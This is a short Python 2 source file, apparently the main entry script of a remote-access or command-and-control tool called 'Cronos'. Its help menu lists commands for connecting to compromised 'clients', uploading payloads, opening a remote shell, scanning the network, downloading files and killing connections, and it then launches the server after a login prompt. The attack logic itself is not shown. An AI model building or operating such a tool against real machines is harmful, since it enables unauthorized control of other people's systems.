#Cronos Main
from banner import banner
from oauth import oauth
from var import *
from create_user import create
from server import Main

COMMANDS = ['help', 'client', 'clients', 'upload', 'shell', 'pwd', 'exit', 'kill', 'scan', 'ls',
            'system', 'wget', 'cat', 'crypt']
HELP = '''
    -h --help           --Show the help menu
    -c --client [ID]    --Connect to client using <client ID>
    -clients            --Show all connected clients
    -u --upload         --Upload file, executable, payload etc.
    -shell              --Open shell and execute commands
    -exit               --Exit the server and keep all clients alive
    -end                --Kill current connection
    -kill               --Kill all active connections
    -scan               --Scan the network
    -system             --Show all current system information
    -wget               --Download file from web
    -crypt              --Generate crypto token
    '''

banner()
#print target
#print host
print HELP
q = raw_input("Sign in as existing user? [y/n] ")
if q == "y" or q == "Y":
    oauth()
    Main()
else:
    create()
    Main()
